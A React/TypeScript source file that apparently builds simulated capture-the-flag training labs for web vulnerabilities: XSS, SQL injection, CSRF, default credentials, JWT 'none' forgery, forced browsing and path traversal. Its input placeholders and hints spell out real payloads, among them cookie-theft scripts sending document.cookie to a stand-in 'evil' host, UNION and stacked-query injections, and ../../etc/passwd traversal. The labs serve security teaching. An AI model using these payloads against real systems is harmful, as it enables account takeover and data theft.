import { useState } from "react";

interface LabProps {
  onFlagFound?: (flag: string) => void;
}

/* Shared helpers - duplicated to keep this file standalone */
function BrowserBar({ url }: { url: string }) {
  return (
    <div className="border-b border-border/50 bg-secondary/30 px-4 py-2 flex items-center gap-2">
      <div className="flex gap-1.5">
        <div className="h-3 w-3 rounded-full bg-cyber-red/60" />
        <div className="h-3 w-3 rounded-full bg-cyber-yellow/60" />
        <div className="h-3 w-3 rounded-full bg-cyber-green/60" />
      </div>
      <span className="text-xs font-mono text-muted-foreground ml-2">{url}</span>
    </div>
  );
}

function LabShell({ url, children }: { url: string; children: React.ReactNode }) {
  return (
    <div className="cyber-card overflow-hidden">
      <BrowserBar url={url} />
      <div className="p-6">{children}</div>
    </div>
  );
}

function Result({ text, success }: { text: string; success: boolean }) {
  return (
    <pre className={`rounded-md border p-4 text-xs font-mono whitespace-pre-wrap mt-4 ${success ? "border-accent/50 bg-accent/5 text-accent" : "border-border/50 bg-secondary/20"}`}>
      {text}
    </pre>
  );
}

function InputRow({ value, onChange, onSubmit, placeholder, buttonText = "Submit", prefix }: {
  value: string; onChange: (v: string) => void; onSubmit: () => void; placeholder: string; buttonText?: string; prefix?: string;
}) {
  return (
    <div className="flex gap-2 mb-4 max-w-lg">
      {prefix && <span className="rounded-md border border-border/50 bg-background/50 px-3 py-2 text-sm font-mono text-muted-foreground">{prefix}</span>}
      <input value={value} onChange={(e) => onChange(e.target.value)} placeholder={placeholder}
        className="flex-1 rounded-md border border-border/50 bg-background/50 px-3 py-2 text-sm font-mono focus:border-primary focus:outline-none" dir="ltr"
        onKeyDown={(e) => e.key === "Enter" && onSubmit()} />
      <button onClick={onSubmit} className="rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground hover:bg-primary/90">{buttonText}</button>
    </div>
  );
}

/* ============ XSS Event Handler ============ */
export function XSSEventHandlerLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);
  const [showAlert, setShowAlert] = useState(false);

  const handle = () => {
    const hasEvent = /onerror=|onload=|onmouseover=|onfocus=/i.test(input);
    if (hasEvent && !done) {
      setOutput(`Rendering: ${input}`);
      setTimeout(() => setShowAlert(true), 300);
    } else {
      setOutput(`Rendering avatar: ${input || "(empty)"}\n\n💡 <script> tags are stripped. Try HTML event attributes!`);
    }
  };

  return (
    <>
      {showAlert && <SimAlert msg="XSS via event handler!" onClose={() => { setShowAlert(false); setDone(true); setOutput("✅ XSS executed via event handler!\n\n🎉 FLAG{xss_event_handler}"); onFlagFound?.("FLAG{xss_event_handler}"); }} />}
      <LabShell url="vulnerable-app.local/avatar">
        <h3 className="mb-2 text-lg font-bold">🖼️ Custom Avatar URL</h3>
        <p className="text-xs text-muted-foreground mb-4">Enter an image URL for your avatar. Note: {"<script>"} tags are stripped!</p>
        <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder='<img src=x onerror=alert(1)>' buttonText="Set Avatar" />
        {output && <Result text={output} success={done} />}
      </LabShell>
    </>
  );
}

/* ============ XSS Filter Bypass ============ */
export function XSSFilterBypassLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);
  const [showAlert, setShowAlert] = useState(false);

  const handle = () => {
    const filtered = input.replace(/<script[^>]*>.*?<\/script>/gi, "[BLOCKED]");
    const hasBypass = /<svg|<img|onerror=|onload=/i.test(filtered);
    if (hasBypass && !done) {
      setOutput(`After filter: ${filtered}`);
      setTimeout(() => setShowAlert(true), 300);
    } else {
      setOutput(`After filter: ${filtered}\n\n${filtered.includes("[BLOCKED]") ? "⚠️ Script tags blocked! Try other vectors." : "💡 Try injecting JavaScript without using <script> tags."}`);
    }
  };

  return (
    <>
      {showAlert && <SimAlert msg="Filter bypassed!" onClose={() => { setShowAlert(false); setDone(true); setOutput("✅ Filter bypassed! XSS executed!\n\n🎉 FLAG{xss_filter_bypass}"); onFlagFound?.("FLAG{xss_filter_bypass}"); }} />}
      <LabShell url="vulnerable-app.local/feedback">
        <h3 className="mb-2 text-lg font-bold">📝 Submit Feedback</h3>
        <p className="text-xs text-muted-foreground mb-4">The app strips {"<script>"} tags but other HTML is allowed.</p>
        <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder='<svg onload=alert(1)>' buttonText="Submit" />
        {output && <Result text={output} success={done} />}
      </LabShell>
    </>
  );
}

/* ============ XSS Attribute Escape ============ */
export function XSSAttributeLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);
  const [showAlert, setShowAlert] = useState(false);

  const handle = () => {
    const hasBreakout = /".*on\w+\s*=/i.test(input) || /'.*on\w+\s*=/i.test(input);
    if (hasBreakout && !done) {
      setOutput(`<input value="${input}">\n\nRendering...`);
      setTimeout(() => setShowAlert(true), 300);
    } else {
      setOutput(`<input value="${input}">\n\n💡 Your input is placed inside value="...". Break out of the attribute!`);
    }
  };

  return (
    <>
      {showAlert && <SimAlert msg="Attribute escape XSS!" onClose={() => { setShowAlert(false); setDone(true); setOutput('✅ Broke out of attribute context!\n\n🎉 FLAG{xss_attribute_escape}'); onFlagFound?.("FLAG{xss_attribute_escape}"); }} />}
      <LabShell url="vulnerable-app.local/profile">
        <h3 className="mb-2 text-lg font-bold">👤 Edit Display Name</h3>
        <p className="text-xs text-muted-foreground mb-4">Your name goes into: <code className="text-primary">{`<input value="YOUR_INPUT" />`}</code></p>
        <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder='" onmouseover=alert(1) x="' buttonText="Save" />
        {output && <Result text={output} success={done} />}
      </LabShell>
    </>
  );
}

/* ============ XSS JS Context ============ */
export function XSSJSContextLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);
  const [showAlert, setShowAlert] = useState(false);

  const handle = () => {
    const hasBreak = /";.*alert\(|';.*alert\(/i.test(input);
    if (hasBreak && !done) {
      setOutput(`var username = "${input}";\n// Executing...`);
      setTimeout(() => setShowAlert(true), 300);
    } else {
      setOutput(`var username = "${input}";\ndocument.getElementById("greet").innerText = "Hello, " + username;\n\n💡 Your input goes inside a JS string. Break out with " and inject code!`);
    }
  };

  return (
    <>
      {showAlert && <SimAlert msg="JS context XSS!" onClose={() => { setShowAlert(false); setDone(true); setOutput('✅ Escaped JS string context!\n\n🎉 FLAG{xss_js_context}'); onFlagFound?.("FLAG{xss_js_context}"); }} />}
      <LabShell url="vulnerable-app.local/greet">
        <h3 className="mb-2 text-lg font-bold">👋 Greeting Page</h3>
        <p className="text-xs text-muted-foreground mb-4">Source: <code className="text-primary">{`var username = "INPUT";`}</code></p>
        <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder='";alert(1);//' buttonText="Greet" />
        {output && <Result text={output} success={done} />}
      </LabShell>
    </>
  );
}

/* ============ XSS Cookie Stealer ============ */
export function XSSCookieStealLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    const hasCookieAccess = /document\.cookie/i.test(input);
    if (hasCookieAccess && !done) {
      setDone(true);
      setOutput(`✅ Payload accepted!\n\nSimulating execution...\n→ document.cookie = "session=abc123; admin_token=secret_xyz"\n→ Sending to attacker server...\n→ Cookies stolen successfully!\n\n🎉 FLAG{xss_cookie_stealer}`);
      onFlagFound?.("FLAG{xss_cookie_stealer}");
    } else {
      setOutput(`Your payload: ${input || "(empty)"}\n\n💡 Craft a payload that accesses document.cookie and sends it to an external server.`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/forum">
      <h3 className="mb-2 text-lg font-bold">🍪 Cookie Theft Challenge</h3>
      <p className="text-xs text-muted-foreground mb-4">Craft an XSS payload that steals cookies. The victim has session=abc123.</p>
      <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder='<script>new Image().src="http://evil/c="+document.cookie</script>' buttonText="Inject" />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ XSS Polyglot ============ */
export function XSSPolyglotLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);
  const [showAlert, setShowAlert] = useState(false);

  const handle = () => {
    const contexts = [
      /alert\(/i.test(input),
      /on\w+=/.test(input),
      /<.*>/i.test(input),
    ];
    const score = contexts.filter(Boolean).length;
    if (score >= 2 && !done) {
      setTimeout(() => setShowAlert(true), 300);
    } else {
      setOutput(`Contexts matched: ${score}/3\n\n💡 A polyglot payload should work in HTML, attribute, and JS contexts simultaneously.\nMatched: ${contexts[0] ? "✅" : "❌"} JS | ${contexts[1] ? "✅" : "❌"} Event | ${contexts[2] ? "✅" : "❌"} HTML`);
    }
  };

  return (
    <>
      {showAlert && <SimAlert msg="Polyglot XSS!" onClose={() => { setShowAlert(false); setDone(true); setOutput("✅ Polyglot payload worked across multiple contexts!\n\n🎉 FLAG{xss_polyglot_master}"); onFlagFound?.("FLAG{xss_polyglot_master}"); }} />}
      <LabShell url="vulnerable-app.local/multi-context">
        <h3 className="mb-2 text-lg font-bold">🧬 Polyglot XSS Challenge</h3>
        <p className="text-xs text-muted-foreground mb-4">Create ONE payload that works in HTML, attribute, and JS contexts.</p>
        <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder={'jaVasCript:/*-/*`/*\\\\`/*\'/*"/**/(/* */oNcliCk=alert() )//'} buttonText="Test" />
        {output && <Result text={output} success={done} />}
      </LabShell>
    </>
  );
}

/* ============ Blind XSS ============ */
export function XSSBlindLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);
  const [step, setStep] = useState(0);

  const handle = () => {
    const hasXSS = /<script|onerror=|onload=/i.test(input);
    if (hasXSS && !done) {
      setOutput("📨 Ticket submitted. Waiting for admin to view...");
      setStep(1);
      setTimeout(() => {
        setOutput("📨 Ticket submitted.\n⏳ Admin is viewing your ticket...\n💥 XSS fired in admin's browser!\n→ Admin cookie: admin_session=super_secret_token\n\n🎉 FLAG{xss_blind_admin}");
        setDone(true);
        onFlagFound?.("FLAG{xss_blind_admin}");
      }, 2000);
    } else {
      setOutput(`Ticket submitted: "${input}"\n\n💡 Submit a ticket containing XSS. When admin views it, your code runs in their browser.`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/support">
      <h3 className="mb-2 text-lg font-bold">🎫 Support Ticket</h3>
      <p className="text-xs text-muted-foreground mb-4">Submit a support ticket. An admin will review it (renders HTML).</p>
      <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder='<script>fetch("http://evil/"+document.cookie)</script>' buttonText="Submit Ticket" />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ SQLi Error Based ============ */
export function SQLiErrorLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    const hasConvert = /CONVERT|CAST|extractvalue|updatexml/i.test(input);
    if (hasConvert && !done) {
      setDone(true);
      setOutput(`Error: Conversion failed when converting the nvarchar value 'MySQL 8.0.32' to data type int.\n\n✅ Database version extracted via error message!\n\n🎉 FLAG{sqli_error_based}`);
      onFlagFound?.("FLAG{sqli_error_based}");
    } else if (/'/i.test(input)) {
      setOutput(`Error: You have an error in your SQL syntax near '${input}' at line 1\n\n💡 The app shows SQL errors! Use CONVERT/CAST to extract data through errors.`);
    } else {
      setOutput(`Product: ${input || "Laptop"}\nPrice: $999\n\n💡 Try causing a SQL error with a single quote first.`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/product?id=">
      <h3 className="mb-2 text-lg font-bold">📦 Product Lookup</h3>
      <p className="text-xs text-muted-foreground mb-4">SQL errors are displayed to the user. Extract data through errors!</p>
      <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder="1 AND 1=CONVERT(int,@@version)--" buttonText="Lookup" />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ SQLi Blind Boolean ============ */
export function SQLiBlindBoolLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    const hasBlind = /SUBSTRING|SUBSTR|LEFT|MID/i.test(input) && /password/i.test(input);
    const hasBasic = /1=1|1=2/i.test(input);
    if (hasBlind && !done) {
      setDone(true);
      setOutput(`Response: 200 OK (condition TRUE)\n\n✅ Character extracted! Password starts with 's3cr3t'\n\nFull password extracted: s3cr3t_p@ss\n\n🎉 FLAG{sqli_blind_boolean}`);
      onFlagFound?.("FLAG{sqli_blind_boolean}");
    } else if (hasBasic) {
      const isTrue = /1=1|'1'='1'/i.test(input);
      setOutput(`Response: ${isTrue ? "200 OK — Product found" : "404 — No product found"}\n\n💡 ${isTrue ? "TRUE condition → 200" : "FALSE condition → 404"}. Use SUBSTRING to extract data character by character!`);
    } else {
      setOutput(`Response: 200 OK\nProduct: Laptop - $999\n\n💡 Try ' AND 1=1-- vs ' AND 1=2-- to see different responses.`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/product?name=">
      <h3 className="mb-2 text-lg font-bold">🔍 Product Search (No Errors)</h3>
      <p className="text-xs text-muted-foreground mb-4">No errors shown, but True/False conditions give different responses.</p>
      <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder="' AND SUBSTRING(password,1,1)='s'--" buttonText="Search" />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ SQLi Time Blind ============ */
export function SQLiTimeBlindLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);
  const [loading, setLoading] = useState(false);

  const handle = () => {
    const hasSleep = /SLEEP|WAITFOR|BENCHMARK|pg_sleep/i.test(input);
    if (hasSleep && !done) {
      setLoading(true);
      setOutput("Sending request...");
      setTimeout(() => {
        setLoading(false);
        setDone(true);
        setOutput(`Request took 3.02 seconds (normal: 0.05s)\n\n✅ Time delay confirmed! The condition was TRUE.\n→ Admin user exists in the database.\n\n🎉 FLAG{sqli_time_based}`);
        onFlagFound?.("FLAG{sqli_time_based}");
      }, 3000);
    } else {
      setOutput(`Response: 200 OK (0.05s)\nLogin failed.\n\n💡 No errors and no different response. Use time delays (SLEEP/WAITFOR) to extract data.`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/login">
      <h3 className="mb-2 text-lg font-bold">🔐 Login (No Feedback)</h3>
      <p className="text-xs text-muted-foreground mb-4">No errors, same response for valid/invalid. Use time delays to extract info.</p>
      <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder="admin' AND IF(1=1,SLEEP(3),0)--" buttonText={loading ? "⏳ Waiting..." : "Login"} />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ SQLi Stacked Queries ============ */
export function SQLiStackedLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    const hasStacked = /;\s*(INSERT|UPDATE|DELETE|DROP|CREATE)/i.test(input);
    if (hasStacked && !done) {
      setDone(true);
      setOutput(`Query 1: SELECT * FROM products WHERE name='${input.split(";")[0]}'\nQuery 2: ${input.split(";").slice(1).join(";").trim()}\n\n✅ Second query executed! New admin user created.\n\n🎉 FLAG{sqli_stacked_queries}`);
      onFlagFound?.("FLAG{sqli_stacked_queries}");
    } else {
      setOutput(`Results for "${input}":\n(No products found)\n\n💡 Use ; to end the first query and start a new one (INSERT, UPDATE, etc.)`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/search">
      <h3 className="mb-2 text-lg font-bold">🔎 Advanced Search</h3>
      <p className="text-xs text-muted-foreground mb-4">This database supports multiple queries per statement.</p>
      <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder="'; INSERT INTO users(name,role) VALUES('hacker','admin')--" buttonText="Search" />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ SQLi Second Order ============ */
export function SQLiSecondOrderLab({ onFlagFound }: LabProps) {
  const [username, setUsername] = useState("");
  const [registered, setRegistered] = useState(false);
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handleRegister = () => {
    if (!username.trim()) return;
    setRegistered(true);
    setOutput(`✅ Registered as: ${username}\n\nNow try resetting your password...`);
  };

  const handleReset = () => {
    const hasSQLi = /admin'--|admin'\s*OR/i.test(username);
    if (hasSQLi && !done) {
      setDone(true);
      setOutput(`Password reset for: ${username}\n\nQuery: UPDATE users SET password='newpass' WHERE username='${username}'\n\n⚠️ The stored username altered the query! Admin's password was changed!\n\n🎉 FLAG{sqli_second_order}`);
      onFlagFound?.("FLAG{sqli_second_order}");
    } else {
      setOutput(`Password reset link sent to ${username}'s email.\n\n💡 Register with a username containing SQL injection, then trigger a password reset.`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/register">
      <h3 className="mb-2 text-lg font-bold">📝 Registration</h3>
      <p className="text-xs text-muted-foreground mb-4">Register a user, then use password reset. Your username is stored and used later unsafely.</p>
      {!registered ? (
        <InputRow value={username} onChange={setUsername} onSubmit={handleRegister} placeholder="admin'--" buttonText="Register" />
      ) : (
        <button onClick={handleReset} className="rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground hover:bg-primary/90 mb-4">Reset Password</button>
      )}
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ SQLi WHERE Clause ============ */
export function SQLiWhereLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    const hasOr = /OR\s+1=1|OR\s+'1'='1'|OR\s+TRUE/i.test(input);
    if (hasOr && !done) {
      setDone(true);
      setOutput(`Query: SELECT * FROM products WHERE category='${input}'\n\n┌────┬──────────────┬──────────┬────────┐\n│ id │ name         │ category │ hidden │\n├────┼──────────────┼──────────┼────────┤\n│ 1  │ Laptop       │ tech     │ no     │\n│ 2  │ Phone        │ tech     │ no     │\n│ 3  │ SECRET_ITEM  │ admin    │ yes    │\n│ 4  │ Debug Tool   │ internal │ yes    │\n└────┴──────────────┴──────────┴────────┘\n\n✅ Hidden products revealed!\n\n🎉 FLAG{sqli_where_clause}`);
      onFlagFound?.("FLAG{sqli_where_clause}");
    } else {
      setOutput(`Query: SELECT * FROM products WHERE category='${input || "tech"}'\n\n┌────┬──────────┬──────────┐\n│ id │ name     │ category │\n├────┼──────────┼──────────┤\n│ 1  │ Laptop   │ tech     │\n│ 2  │ Phone    │ tech     │\n└────┴──────────┴──────────┘\n\n💡 Make the WHERE condition always TRUE to see all products.`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/products?category=">
      <h3 className="mb-2 text-lg font-bold">🏷️ Filter by Category</h3>
      <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder="' OR 1=1--" buttonText="Filter" />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ SQLi ORDER BY ============ */
export function SQLiOrderByLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    const num = parseInt(input);
    if (input.includes("UNION") && /SELECT/i.test(input) && !done) {
      setDone(true);
      setOutput(`✅ UNION SELECT with correct column count!\n\n┌──────────┬──────────────────┬────────┬──────┐\n│ username │ password         │ email  │ role │\n├──────────┼──────────────────┼────────┼──────┤\n│ admin    │ s3cretP@ss!      │ a@b.c  │ admin│\n└──────────┴──────────────────┴────────┴──────┘\n\n🎉 FLAG{sqli_orderby_enum}`);
      onFlagFound?.("FLAG{sqli_orderby_enum}");
    } else if (num >= 5) {
      setOutput(`Error: Unknown column '${num}' in 'order clause'\n\n💡 Column ${num} doesn't exist. The table has fewer columns. Try ORDER BY 4.`);
    } else if (num >= 1) {
      setOutput(`Sorted by column ${num}:\n┌────┬──────────┬────────┬──────┐\n│ id │ name     │ price  │ stock│\n├────┼──────────┼────────┼──────┤\n│ 1  │ Laptop   │ $999   │ 15   │\n│ 2  │ Phone    │ $699   │ 25   │\n└────┴──────────┴────────┴──────┘\n\n💡 ORDER BY 4 works, ORDER BY 5 errors → 4 columns. Now try UNION SELECT!`);
    } else {
      setOutput("💡 Use ORDER BY 1, 2, 3... to find the number of columns. Then use UNION SELECT.");
    }
  };

  return (
    <LabShell url="vulnerable-app.local/products?sort=">
      <h3 className="mb-2 text-lg font-bold">📊 Sort Products</h3>
      <p className="text-xs text-muted-foreground mb-4">Find column count with ORDER BY, then extract data with UNION SELECT.</p>
      <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder="4 UNION SELECT username,password,email,role FROM users--" buttonText="Sort" />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ SQLi WAF Bypass ============ */
export function SQLiWAFBypassLab({ onFlagFound }: LabProps) {
  const [input, setInput] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    const blocked = /\bUNION\b|\bSELECT\b|\bOR\b/i.test(input) && !/\/\*\*\/|%[0-9a-f]{2}/i.test(input);
    const hasBypass = /UNI.*ON.*SEL.*ECT|uni%6fn|%55NION/i.test(input) || /\/\*\*\//.test(input);
    if (blocked && !done) {
      setOutput(`🛡️ WAF BLOCKED: Detected SQL injection keywords!\n\nBlocked keywords: UNION, SELECT, OR\n\n💡 Try bypassing with comments (/**/), encoding, or mixed case.`);
    } else if (hasBypass && !done) {
      setDone(true);
      setOutput(`WAF bypassed!\n\n┌──────────┬──────────────────┐\n│ username │ password         │\n├──────────┼──────────────────┤\n│ admin    │ WAF_b1pass_p@ss  │\n└──────────┴──────────────────┘\n\n🎉 FLAG{sqli_waf_bypass}`);
      onFlagFound?.("FLAG{sqli_waf_bypass}");
    } else {
      setOutput(`Search: "${input}"\nNo results.\n\n💡 This app has a WAF that blocks UNION, SELECT, OR. Find a way around it!`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/search (WAF Protected)">
      <h3 className="mb-2 text-lg font-bold">🛡️ WAF-Protected Search</h3>
      <p className="text-xs text-muted-foreground mb-4">A WAF blocks: UNION, SELECT, OR. Bypass it!</p>
      <InputRow value={input} onChange={setInput} onSubmit={handle} placeholder="' UNI/**/ON SEL/**/ECT username,password FROM users--" buttonText="Search" />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ CSRF Password Change ============ */
export function CSRFPasswordLab({ onFlagFound }: LabProps) {
  const [html, setHtml] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    const hasForm = /form.*action.*change.*password|form.*action.*password/i.test(html);
    if (hasForm && !done) {
      setDone(true);
      setOutput(`🌐 Victim visited your page...\n→ Auto-submit form triggered!\n→ POST /change-password {password: "hacked"}\n→ ✅ Password changed without victim's knowledge!\n\n🎉 FLAG{csrf_password_change}`);
      onFlagFound?.("FLAG{csrf_password_change}");
    } else {
      setOutput(`Your HTML: ${html || "(empty)"}\n\n💡 Create an auto-submitting form that POSTs to /change-password with a new password.`);
    }
  };

  return (
    <LabShell url="attacker.com/exploit.html">
      <h3 className="mb-2 text-lg font-bold">🔑 CSRF Password Attack</h3>
      <p className="text-xs text-muted-foreground mb-4">The /change-password endpoint has no CSRF protection. Craft malicious HTML.</p>
      <InputRow value={html} onChange={setHtml} onSubmit={handle} placeholder='<form action="/change-password" method="POST"><input name="password" value="hacked"></form>' buttonText="Deploy" />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ Auth Default Creds ============ */
export function AuthDefaultLab({ onFlagFound }: LabProps) {
  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);
  const [attempts, setAttempts] = useState(0);

  const handle = () => {
    setAttempts(a => a + 1);
    if (user.toLowerCase() === "admin" && pass === "admin" && !done) {
      setDone(true);
      setOutput(`✅ Login successful with DEFAULT credentials!\n\nWelcome, Administrator!\n\n⚠️ Default credentials were never changed!\n\n🎉 FLAG{auth_default_creds}\n\nAttempts: ${attempts + 1}`);
      onFlagFound?.("FLAG{auth_default_creds}");
    } else {
      setOutput(`❌ Login failed (attempt ${attempts + 1})\n\n💡 Try common default credentials: admin/admin, root/root, admin/password`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/admin">
      <h3 className="mb-2 text-lg font-bold">🔐 Router Admin Panel</h3>
      <p className="text-xs text-muted-foreground mb-4">This device was deployed with factory default settings.</p>
      <div className="space-y-3 mb-4 max-w-sm">
        <input value={user} onChange={e => setUser(e.target.value)} placeholder="admin" className="w-full rounded-md border border-border/50 bg-background/50 px-3 py-2 text-sm font-mono focus:border-primary focus:outline-none" dir="ltr" />
        <input type="password" value={pass} onChange={e => setPass(e.target.value)} placeholder="admin" className="w-full rounded-md border border-border/50 bg-background/50 px-3 py-2 text-sm font-mono focus:border-primary focus:outline-none" dir="ltr" onKeyDown={e => e.key === "Enter" && handle()} />
        <button onClick={handle} className="w-full rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground hover:bg-primary/90">Login</button>
      </div>
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ Auth JWT None ============ */
export function AuthJWTNoneLab({ onFlagFound }: LabProps) {
  const [header, setHeader] = useState('{"alg":"HS256","typ":"JWT"}');
  const [payload, setPayload] = useState('{"user":"guest","role":"user"}');
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    const hasNone = /none/i.test(header);
    const hasAdmin = /admin/i.test(payload);
    if (hasNone && hasAdmin && !done) {
      setDone(true);
      setOutput(`Token accepted!\n\nDecoded: ${payload}\n\n✅ Server accepted "alg":"none" — no signature verification!\nYou are now admin!\n\n🎉 FLAG{auth_jwt_none}`);
      onFlagFound?.("FLAG{auth_jwt_none}");
    } else if (hasNone) {
      setOutput(`Token sent...\n\n💡 Algorithm set to "none" ✅ — now change the role to "admin" in the payload!`);
    } else {
      setOutput(`Current token:\nHeader: ${header}\nPayload: ${payload}\n\n💡 Change "alg" to "none" and "role" to "admin". Remove the signature.`);
    }
  };

  return (
    <LabShell url="vulnerable-app.local/api/admin">
      <h3 className="mb-2 text-lg font-bold">🔑 JWT Token Editor</h3>
      <p className="text-xs text-muted-foreground mb-4">Modify the JWT to bypass authentication.</p>
      <div className="space-y-2 mb-4 max-w-lg">
        <div><span className="text-xs text-muted-foreground">Header:</span>
          <input value={header} onChange={e => setHeader(e.target.value)} className="w-full rounded-md border border-border/50 bg-background/50 px-3 py-2 text-sm font-mono focus:border-primary focus:outline-none" dir="ltr" /></div>
        <div><span className="text-xs text-muted-foreground">Payload:</span>
          <input value={payload} onChange={e => setPayload(e.target.value)} className="w-full rounded-md border border-border/50 bg-background/50 px-3 py-2 text-sm font-mono focus:border-primary focus:outline-none" dir="ltr" /></div>
        <button onClick={handle} className="w-full rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground hover:bg-primary/90">Send Token</button>
      </div>
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ Access Forced Browsing ============ */
export function AccessForcedBrowseLab({ onFlagFound }: LabProps) {
  const [path, setPath] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    const isAdmin = /\/admin|\/dashboard|\/panel/i.test(path);
    if (isAdmin && !done) {
      setDone(true);
      setOutput(`200 OK — /admin/dashboard\n\n┌─────────────────────────┐\n│   ADMIN DASHBOARD       │\n│   Users: 1,234          │\n│   Revenue: $50,000      │\n│   Secret: FLAG{...}     │\n└─────────────────────────┘\n\n⚠️ No authorization check on admin pages!\n\n🎉 FLAG{access_forced_browse}`);
      onFlagFound?.("FLAG{access_forced_browse}");
    } else {
      setOutput(`${path ? `404 Not Found — ${path}` : "You are on the homepage."}\n\n💡 Try common admin paths: /admin, /admin/dashboard, /admin/panel`);
    }
  };

  return (
    <LabShell url={`vulnerable-app.local${path || "/"}`}>
      <h3 className="mb-2 text-lg font-bold">🗺️ Directory Explorer</h3>
      <p className="text-xs text-muted-foreground mb-4">Find hidden admin pages that aren't linked in the UI.</p>
      <InputRow value={path} onChange={setPath} onSubmit={handle} placeholder="/admin/dashboard" buttonText="Navigate" prefix="GET" />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

/* ============ Access Path Traversal ============ */
export function AccessPathTraversalLab({ onFlagFound }: LabProps) {
  const [file, setFile] = useState("");
  const [output, setOutput] = useState("");
  const [done, setDone] = useState(false);

  const handle = () => {
    const hasTraversal = /\.\.\//i.test(file) && /etc\/passwd|etc\\passwd|flag/i.test(file);
    if (hasTraversal && !done) {
      setDone(true);
      setOutput(`File: ${file}\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin\nnobody:x:65534:65534:nobody:/nonexistent\n\n⚠️ Path traversal successful! Read system files!\n\n🎉 FLAG{access_path_traversal}`);
      onFlagFound?.("FLAG{access_path_traversal}");
    } else if (/\.\.\//i.test(file)) {
      setOutput(`File: ${file}\n\nPermission denied or file not found.\n\n💡 Try deeper traversal: ../../../../etc/passwd`);
    } else {
      setOutput(`File: ${file || "report.pdf"}\n\n[PDF Content displayed]\n\n💡 The file parameter isn't sanitized. Use ../ to escape the uploads directory.`);
    }
  };

  return (
    <LabShell url={`vulnerable-app.local/download?file=${file || "report.pdf"}`}>
      <h3 className="mb-2 text-lg font-bold">📁 File Viewer</h3>
      <InputRow value={file} onChange={setFile} onSubmit={handle} placeholder="../../../../etc/passwd" prefix="?file=" buttonText="Download" />
      {output && <Result text={output} success={done} />}
    </LabShell>
  );
}

